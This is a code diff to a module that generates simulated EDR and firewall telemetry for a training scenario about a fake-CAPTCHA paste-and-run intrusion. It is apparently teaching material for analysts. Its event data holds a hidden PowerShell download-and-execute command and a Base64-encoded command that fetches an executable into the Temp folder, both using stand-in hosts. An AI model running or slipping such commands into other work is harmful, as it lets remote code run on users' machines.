@@ -31,6 +31,8 @@
 
 import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
 import { makeSha256 } from "@/lib/sim/iocs";
+import { csFile, csProcess, csDetection } from "@/lib/sim/emitters/crowdstrike";
+import { panWeb } from "@/lib/sim/emitters/paloalto";
 
 export function buildClickFixFakeCaptchaScenario(
   scenarioId = "clickfix-fake-captcha-2026",
@@ -41,7 +43,8 @@ export function buildClickFixFakeCaptchaScenario(
 
   const host = { hostname: "WS-3387", ip: "10.14.19.56" };
   const victim = { email: "t.avraham@nexacorp.com", name: "Tomer Avraham", sam: "t.avraham" };
-  const sensorId = "a92f5e17c084b3d1af06c2eaa3d5bb44";
+  // Shared emitter context — one NexaCorp workstation, CrowdStrike + Palo Alto.
+  const cs = { companyId: "nexacorp", host: host.hostname, user: victim.email, srcIp: host.ip };
 
   // Attacker-run lure page — built specifically to host the fake CAPTCHA,
   // not a hijacked trusted resource. A different teaching point from other
@@ -66,421 +69,96 @@ export function buildClickFixFakeCaptchaScenario(
 
   const events: TelemetryEvent[] = [
     // ---------------------------------------------------------------------
-    // 1. The user lands on the lure page. Ordinary web browsing, allowed.
+    // 1-9. The ClickFix paste-and-run chain — CrowdStrike + Palo Alto, generated
+    //      by the typed emitters. Host, user (NEXACORP\t.avraham), PIDs and hashes
+    //      thread consistently; every raw block uses only registry-valid fields.
     // ---------------------------------------------------------------------
-    {
-      id: "evt_cfc_01_lure_page",
-      ts: T(0),
-      source: "firewall",
-      vendor: "Palo Alto Networks PAN-OS",
-      event_type: "http_request",
-      hostname: host.hostname,
-      user_email: victim.email,
-      user_title: "Sales Development Representative",
-      src_ip: host.ip,
-      severity: "low",
-      description:
-        "WS-3387 loaded a 'free invoice template' page on invoice-templates-pro.com at 14:10, allowed under the category computer-and-internet-info.",
-      network: {
-        url: `https://${lurePage}/templates/free-download`,
-        domain: lurePage,
-        method: "GET",
-        status: 200,
-        bytes_in: 61_204,
-        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
-      },
-      raw: {
-        "pan.type": "THREAT",
-        "pan.subtype": "url",
-        "pan.action": "alert",
-        "pan.rule": "CORP-WEB-OUTBOUND",
-        "pan.src": host.ip,
-        "pan.srcuser": `nexacorp\\${victim.sam}`,
-        "pan.dst": "146.190.62.4",
-        "pan.dport": "443",
-        "pan.app": "web-browsing",
-        "pan.category": "computer-and-internet-info",
-        "pan.url": `${lurePage}/templates/free-download`,
-        "pan.http_method": "GET",
-        "pan.from_zone": "TRUST",
-        "pan.to_zone": "UNTRUST",
-        "pan.session_id": "702214",
-        "source.ip": host.ip,
-        "url.domain": lurePage,
-        "http.response.status_code": "200",
-        "action_result": "alert",
-      },
-    },
 
-    // ---------------------------------------------------------------------
-    // 2. The fake CAPTCHA widget loads. This is what copies the command to
-    //    the clipboard client-side — nothing here is a file, so nothing here
-    //    is scanned as one.
-    // ---------------------------------------------------------------------
-    {
-      id: "evt_cfc_02_widget_fetch",
-      ts: T(45_000),
-      source: "firewall",
-      vendor: "Palo Alto Networks PAN-OS",
-      event_type: "http_request",
-      hostname: host.hostname,
-      user_email: victim.email,
-      src_ip: host.ip,
-      severity: "low",
-      description:
-        "Forty-five seconds later the page loaded /widget/captcha.js from human-verify-check.net, referred by the invoice-templates-pro.com page.",
-      network: {
-        url: `https://${widgetHost}/widget/captcha.js`,
-        domain: widgetHost,
-        method: "GET",
-        status: 200,
-        bytes_in: 9_872,
-      },
-      raw: {
-        "pan.type": "THREAT",
-        "pan.subtype": "url",
-        "pan.action": "alert",
-        "pan.rule": "CORP-WEB-OUTBOUND",
-        "pan.src": host.ip,
-        "pan.srcuser": `nexacorp\\${victim.sam}`,
-        "pan.dst": "185.207.14.92",
-        "pan.dport": "443",
-        "pan.app": "web-browsing",
-        "pan.category": "computer-and-internet-info",
-        "pan.url": `${widgetHost}/widget/captcha.js`,
-        "pan.referer": `https://${lurePage}/templates/free-download`,
-        "pan.http_method": "GET",
-        "pan.from_zone": "TRUST",
-        "pan.to_zone": "UNTRUST",
-        "pan.session_id": "702239",
-        "source.ip": host.ip,
-        "url.domain": widgetHost,
-        "http.response.status_code": "200",
-        "action_result": "alert",
-      },
-    },
+    // 1. The user lands on the attacker-run lure page.
+    panWeb({
+      ...cs, id: "evt_cfc_01_lure_page", ts: T(0), severity: "low",
+      url: `https://${lurePage}/templates/free-download`, domain: lurePage,
+      category: "computer-and-internet-info", action: "alert", dstIp: "146.190.62.4", status: 200, bytesIn: 61_204,
+      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
+      userTitle: "Sales Development Representative",
+      description: "WS-3387 loaded a 'free invoice template' page on invoice-templates-pro.com at 14:10, allowed under the category computer-and-internet-info.",
+    }),
 
-    // ---------------------------------------------------------------------
-    // 3. THE EVENT THAT MATTERS. No file, no download — explorer.exe starts
-    //    powershell.exe directly, consistent with the Run dialog receiving a
-    //    pasted command rather than a double-clicked file.
-    // ---------------------------------------------------------------------
-    {
-      id: "evt_cfc_03_paste_run",
-      ts: T(2 * MIN + 50_000),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "process_create",
-      hostname: host.hostname,
-      user_email: victim.email,
-      src_ip: host.ip,
-      severity: "high",
-      mitre_technique: "T1204.004",
-      mitre_tactic: "Execution",
-      is_detection: true, // alert-grade: the paste-and-run behavioural detection (the crux)
-      description:
-        "At 14:12:50 explorer.exe started powershell.exe with a hidden-window download-and-run command line. No file was downloaded or written beforehand — the process was launched directly, consistent with a pasted command run from the Windows Run dialog.",
-      process: {
-        name: "powershell.exe",
-        pid: 8840,
-        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        parent_name: "explorer.exe",
-        parent_pid: 3912,
-        cmdline:
-          "powershell.exe -w hidden -c \"iwr -useb https://pkg-delivery-cdn.net/v/init.ps1 | iex\"",
-        user: `NEXACORP\\${victim.sam}`,
-        integrity: "medium",
-        hash: { sha256: powershellHash },
-      },
-      raw: {
-        "crowdstrike.event_simpleName": "ProcessRollup2",
-        "crowdstrike.detection.tactic": "Execution",
-        "crowdstrike.detection.tactic_id": "TA0002",
-        "crowdstrike.detection.technique": "User Execution: Malicious Copy and Paste",
-        "crowdstrike.detection.technique_id": "T1204.004",
-        "crowdstrike.detection.severity": "High",
-        "crowdstrike.detection.pattern_disposition": "10",
-        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
-        "crowdstrike.sensor.id": sensorId,
-        "crowdstrike.network_containment_state": "Not Contained",
-        "event.action": "process_created",
-        "process.name": "powershell.exe",
-        "process.pid": "8840",
-        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "process.command_line":
-          "powershell.exe -w hidden -c \"iwr -useb https://pkg-delivery-cdn.net/v/init.ps1 | iex\"",
-        "process.hash.sha256": powershellHash,
-        "process.signed": "true",
-        "process.parent.name": "explorer.exe",
-        "process.parent.pid": "3912",
-        "user.name": `NEXACORP\\${victim.sam}`,
-        "host.name": host.hostname,
-        "host.ip": host.ip,
-      },
-    },
+    // 2. The fake-CAPTCHA widget loads (it copies the command to the clipboard).
+    panWeb({
+      ...cs, id: "evt_cfc_02_widget_fetch", ts: T(45_000), severity: "low",
+      url: `https://${widgetHost}/widget/captcha.js`, domain: widgetHost,
+      category: "computer-and-internet-info", action: "alert", dstIp: "185.207.14.92", status: 200, bytesIn: 9_872,
+      referer: `https://${lurePage}/templates/free-download`,
+      description: "Forty-five seconds later the page loaded /widget/captcha.js from human-verify-check.net, referred by the invoice-templates-pro.com page.",
+    }),
 
-    // ---------------------------------------------------------------------
+    // 3. THE CRUX — explorer directly spawns PowerShell (a pasted Run-dialog command,
+    //    no antecedent download).
+    csProcess({
+      ...cs, id: "evt_cfc_03_paste_run", ts: T(2 * MIN + 50_000),
+      processName: "powershell.exe", pid: 8840, processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      cmdline: "powershell.exe -w hidden -c \"iwr -useb https://pkg-delivery-cdn.net/v/init.ps1 | iex\"",
+      parentName: "explorer.exe", parentPid: 3912, sha256: powershellHash, signed: true,
+      mitre: "T1204.004", tactic: "Execution", severity: "high", isDetection: true,
+      description: "At 14:12:50 explorer.exe started powershell.exe with a hidden-window download-and-run command line. No file was downloaded or written beforehand — the process was launched directly, consistent with a pasted command run from the Windows Run dialog.",
+    }),
+
     // 4. The fileless stager pulls its content directly into memory.
-    // ---------------------------------------------------------------------
-    {
-      id: "evt_cfc_04_stager_fetch",
-      ts: T(2 * MIN + 53_000),
-      source: "firewall",
-      vendor: "Palo Alto Networks PAN-OS",
-      event_type: "http_request",
-      hostname: host.hostname,
-      user_email: victim.email,
-      src_ip: host.ip,
-      severity: "medium",
-      mitre_technique: "T1105",
-      mitre_tactic: "Command and Control",
-      description:
-        "Three seconds later the same host requested /v/init.ps1 from pkg-delivery-cdn.net, matching the URL in the PowerShell command line.",
-      network: {
-        url: `https://${stagingHost}/v/init.ps1`,
-        domain: stagingHost,
-        method: "GET",
-        status: 200,
-        bytes_in: 8_192,
-      },
-      raw: {
-        "pan.type": "THREAT",
-        "pan.subtype": "url",
-        "pan.action": "alert",
-        "pan.rule": "CORP-WEB-OUTBOUND",
-        "pan.src": host.ip,
-        "pan.srcuser": `nexacorp\\${victim.sam}`,
-        "pan.dst": "91.223.104.17",
-        "pan.dport": "443",
-        "pan.app": "web-browsing",
-        "pan.category": "newly-registered-domain",
-        "pan.url": `${stagingHost}/v/init.ps1`,
-        "pan.session_id": "702318",
-        "source.ip": host.ip,
-        "url.domain": stagingHost,
-        "action_result": "alert",
-      },
-    },
+    panWeb({
+      ...cs, id: "evt_cfc_04_stager_fetch", ts: T(2 * MIN + 53_000), severity: "medium",
+      url: `https://${stagingHost}/v/init.ps1`, domain: stagingHost, category: "newly-registered-domain",
+      action: "alert", dstIp: "91.223.104.17", status: 200, bytesIn: 8_192, mitre: "T1105", tactic: "Command and Control",
+      description: "Three seconds later the same host requested /v/init.ps1 from pkg-delivery-cdn.net, matching the URL in the PowerShell command line.",
+    }),
 
-    // ---------------------------------------------------------------------
-    // 5. The stager spawns a second PowerShell process with an encoded
-    //    command, still nothing on disk.
-    // ---------------------------------------------------------------------
-    {
-      id: "evt_cfc_05_encoded_child",
-      ts: T(2 * MIN + 58_000),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "process_create",
-      hostname: host.hostname,
-      user_email: victim.email,
-      src_ip: host.ip,
-      severity: "critical",
-      mitre_technique: "T1059.001",
-      mitre_tactic: "Execution",
-      description:
-        "Five seconds later the same PowerShell process spawned a child PowerShell process with a Base64-encoded command line.",
-      process: {
-        name: "powershell.exe",
-        pid: 8901,
-        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        parent_name: "powershell.exe",
-        parent_pid: 8840,
-        cmdline:
-          "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAHAAawBnAC0AZABlAGwAaQB2AGUAcgB5AC0AYwBkAG4ALgBuAGUAdAAvAHYALwBzAHkAcwB1AHAAZAAzADIALgBlAHgAZQAnACwAJwAlAFQARQBNAFAAJQBcAHMAeQBzAHUAcABkADMAMgAuAGUAeABlACcAKQA=",
-        user: `NEXACORP\\${victim.sam}`,
-        integrity: "medium",
-        hash: { sha256: powershellHash },
-      },
-      raw: {
-        "crowdstrike.event_simpleName": "ProcessRollup2",
-        "crowdstrike.detection.tactic": "Execution",
-        "crowdstrike.detection.tactic_id": "TA0002",
-        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
-        "crowdstrike.detection.technique_id": "T1059.001",
-        "crowdstrike.detection.severity": "Critical",
-        "crowdstrike.detection.pattern_disposition": "2048",
-        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
-        "crowdstrike.sensor.id": sensorId,
-        "crowdstrike.network_containment_state": "Not Contained",
-        "event.action": "process_created",
-        "process.name": "powershell.exe",
-        "process.pid": "8901",
-        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "process.command_line":
-          "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAHAAawBnAC0AZABlAGwAaQB2AGUAcgB5AC0AYwBkAG4ALgBuAGUAdAAvAHYALwBzAHkAcwB1AHAAZAAzADIALgBlAHgAZQAnACwAJwAlAFQARQBNAFAAJQBcAHMAeQBzAHUAcABkADMAMgAuAGUAeABlACcAKQA=",
-        "process.hash.sha256": powershellHash,
-        "process.signed": "true",
-        "process.parent.name": "powershell.exe",
-        "process.parent.pid": "8840",
-        "user.name": `NEXACORP\\${victim.sam}`,
-        "host.name": host.hostname,
-        "host.ip": host.ip,
-      },
-    },
+    // 5. The stager spawns a child PowerShell with a Base64-encoded command.
+    csProcess({
+      ...cs, id: "evt_cfc_05_encoded_child", ts: T(2 * MIN + 58_000),
+      processName: "powershell.exe", pid: 8901, processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      cmdline: "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAHAAawBnAC0AZABlAGwAaQB2AGUAcgB5AC0AYwBkAG4ALgBuAGUAdAAvAHYALwBzAHkAcwB1AHAAZAAzADIALgBlAHgAZQAnACwAJwAlAFQARQBNAFAAJQBcAHMAeQBzAHUAcABkADMAMgAuAGUAeABlACcAKQA=",
+      parentName: "powershell.exe", parentPid: 8840, sha256: powershellHash, signed: true,
+      mitre: "T1059.001", tactic: "Execution", severity: "critical",
+      description: "Five seconds later the same PowerShell process spawned a child PowerShell process with a Base64-encoded command line.",
+    }),
 
-    // ---------------------------------------------------------------------
-    // 6. The encoded command decodes to a download — this is where a file
-    //    finally appears.
-    // ---------------------------------------------------------------------
-    {
-      id: "evt_cfc_06_stealer_written",
-      ts: T(3 * MIN + 5_000),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "file_create",
-      hostname: host.hostname,
-      user_email: victim.email,
-      src_ip: host.ip,
-      severity: "medium",
-      description:
-        "The encoded command wrote C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe, unsigned, 871 KB.",
-      file: {
-        name: "sysupd32.exe",
-        path: "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
-        extension: "exe",
-        size: 891_648,
-        sha256: stealerHash,
-      },
-      raw: {
-        "crowdstrike.event_simpleName": "NewExecutableWritten",
-        "crowdstrike.sensor.id": sensorId,
-        "event.action": "file_created",
-        "file.name": "sysupd32.exe",
-        "file.path": "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
-        "file.size": "891648",
-        "file.hash.sha256": stealerHash,
-        "file.code_signature.status": "unsigned",
-        "process.name": "powershell.exe",
-        "process.pid": "8901",
-        "user.name": `NEXACORP\\${victim.sam}`,
-        "host.name": host.hostname,
-      },
-    },
+    // 6. The encoded command decodes to a download — the file finally appears.
+    csFile({
+      ...cs, id: "evt_cfc_06_stealer_written", ts: T(3 * MIN + 5_000),
+      path: "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe", sha256: stealerHash, signed: false, severity: "medium",
+      description: "The encoded command wrote C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe, unsigned, 871 KB.",
+    }),
 
-    // ---------------------------------------------------------------------
     // 7. The dropped binary runs.
-    // ---------------------------------------------------------------------
+    csProcess({
+      ...cs, id: "evt_cfc_07_stealer_execute", ts: T(3 * MIN + 9_000),
+      processName: "sysupd32.exe", pid: 9014, processPath: "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
+      cmdline: "\"C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe\"",
+      parentName: "powershell.exe", parentPid: 8901, sha256: stealerHash, signed: false, severity: "high",
+      description: "Four seconds later powershell.exe (PID 8901) launched sysupd32.exe from the Temp folder.",
+    }),
+
+    // 8. Its outbound call is refused at the perimeter (block-url).
+    panWeb({
+      ...cs, id: "evt_cfc_08_c2_blocked", ts: T(3 * MIN + 12_000), severity: "high",
+      url: `https://${c2}/s/2`, domain: c2, category: "newly-registered-domain", action: "block",
+      dstIp: "185.212.171.30", status: 0, mitre: "T1071.001", tactic: "Command and Control",
+      description: "sysupd32.exe's outbound request to sync-metrics-relay.com was denied under the category newly-registered-domain.",
+    }),
+
+    // 9. The Falcon detection that opens the ticket (killed sysupd32.exe).
     {
-      id: "evt_cfc_07_stealer_execute",
-      ts: T(3 * MIN + 9_000),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "process_create",
-      hostname: host.hostname,
-      user_email: victim.email,
-      src_ip: host.ip,
-      severity: "high",
-      description:
-        "Four seconds later powershell.exe (PID 8901) launched sysupd32.exe from the Temp folder.",
-      process: {
-        name: "sysupd32.exe",
-        pid: 9014,
-        path: "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
-        parent_name: "powershell.exe",
-        parent_pid: 8901,
+      ...csDetection({
+        ...cs, id: "evt_cfc_09_edr_alert", ts: T(3 * MIN + 30_000), eventType: "edr_alert",
+        processName: "sysupd32.exe", pid: 9014, parentPid: 8901,
+        processPath: "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
         cmdline: "\"C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe\"",
-        user: `NEXACORP\\${victim.sam}`,
-        integrity: "medium",
-        hash: { sha256: stealerHash },
-      },
-      raw: {
-        "crowdstrike.event_simpleName": "ProcessRollup2",
-        "crowdstrike.sensor.id": sensorId,
-        "crowdstrike.network_containment_state": "Not Contained",
-        "event.action": "process_created",
-        "process.name": "sysupd32.exe",
-        "process.pid": "9014",
-        "process.executable": "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
-        "process.command_line": "\"C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe\"",
-        "process.hash.sha256": stealerHash,
-        "process.signed": "false",
-        "process.code_signature.status": "unsigned",
-        "process.parent.name": "powershell.exe",
-        "process.parent.pid": "8901",
-        "user.name": `NEXACORP\\${victim.sam}`,
-        "host.name": host.hostname,
-        "host.ip": host.ip,
-      },
-    },
-
-    // ---------------------------------------------------------------------
-    // 8. Its outbound call is refused at the perimeter.
-    // ---------------------------------------------------------------------
-    {
-      id: "evt_cfc_08_c2_blocked",
-      ts: T(3 * MIN + 12_000),
-      source: "firewall",
-      vendor: "Palo Alto Networks PAN-OS",
-      event_type: "http_blocked",
-      hostname: host.hostname,
-      user_email: victim.email,
-      src_ip: host.ip,
-      severity: "high",
-      mitre_technique: "T1071.001",
-      mitre_tactic: "Command and Control",
-      description:
-        "sysupd32.exe's outbound request to sync-metrics-relay.com was denied under the category newly-registered-domain.",
-      network: { url: `https://${c2}/s/2`, domain: c2, method: "GET", status: 0 },
-      raw: {
-        "pan.type": "THREAT",
-        "pan.subtype": "url",
-        "pan.action": "block-url",
-        "pan.rule": "BLOCK-NEWLY-REGISTERED",
-        "pan.src": host.ip,
-        "pan.srcuser": `nexacorp\\${victim.sam}`,
-        "pan.dst": "185.212.171.30",
-        "pan.dport": "443",
-        "pan.app": "web-browsing",
-        "pan.category": "newly-registered-domain",
-        "pan.url": `${c2}/s/2`,
-        "pan.session_id": "702381",
-        "source.ip": host.ip,
-        "url.domain": c2,
-        "action_result": "block-url",
-      },
-    },
-
-    // ---------------------------------------------------------------------
-    // 9. The detection that opened the ticket.
-    // ---------------------------------------------------------------------
-    {
-      id: "evt_cfc_09_edr_alert",
-      ts: T(3 * MIN + 30_000),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "edr_alert",
-      hostname: host.hostname,
-      user_email: victim.email,
-      src_ip: host.ip,
-      severity: "critical",
-      is_detection: true,    // the DetectionSummaryEvent — the alert that opens the ticket
-      edr_scope: "edr",      // endpoint-primary → investigated in the EDR console
-      description:
-        "Falcon raised a Critical detection on WS-3387 for a paste-and-run chain — explorer.exe directly spawning PowerShell, no antecedent download — and killed sysupd32.exe.",
-      raw: {
-        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
-        "crowdstrike.detection.name": "ClickFixPasteAndRunChain",
-        "crowdstrike.detection.description":
-          "explorer.exe launched PowerShell with no preceding file download, matching the paste-and-run pattern associated with fake human-verification overlays. The chain fetched and executed an unsigned binary from a newly registered domain.",
-        "crowdstrike.detection.severity": "Critical",
-        "crowdstrike.detection.confidence": "88",
-        "crowdstrike.detection.tactic": "Execution",
-        "crowdstrike.detection.technique": "User Execution: Malicious Copy and Paste",
-        "crowdstrike.detection.technique_id": "T1204.004",
-        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
-        "crowdstrike.detection.parent_process": "explorer.exe",
-        "crowdstrike.detection.process_tree":
-          "explorer.exe > powershell.exe > powershell.exe > sysupd32.exe",
-        "crowdstrike.sensor.id": sensorId,
-        "crowdstrike.network_containment_state": "Not Contained",
-        "crowdstrike.falcon_host_link": "https://falcon.crowdstrike.com/activity/detections/detail/a92f5e17",
-        "event.action": "alert",
-        "event.outcome": "blocked",
-        "host.name": host.hostname,
-        "host.ip": host.ip,
-        "user.name": `NEXACORP\\${victim.sam}`,
-      },
+        sha256: stealerHash, threatName: "ClickFixPasteAndRunChain",
+        action: "killed", expectedVerdict: "tp", mitre: "T1204.004", tactic: "Execution",
+        technique: "User Execution: Malicious Copy and Paste", severity: "critical",
+        description: "Falcon raised a Critical detection on WS-3387 for a paste-and-run chain — explorer.exe directly spawning PowerShell, no antecedent download — and killed sysupd32.exe.",
+      }),
+      edr_scope: "edr",
     },
   ];
 
